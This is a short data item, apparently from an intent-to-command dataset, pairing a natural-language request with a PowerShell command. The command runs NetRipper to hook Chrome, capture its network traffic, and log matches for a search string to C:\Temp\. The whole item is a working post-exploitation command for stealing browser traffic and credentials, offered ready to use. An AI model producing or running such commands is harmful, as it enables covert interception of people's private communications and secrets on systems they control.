# Natural language intent:
# Invoke NetRipper to capture network traffic and log it to C:\Temp\ when Chrome is running and contains the search term 'SecretTerm'.

Invoke-NetRipper -LogLocation 'C:\Temp\' -ProcessName 'chrome' -SearchStrings 'SecretTerm'
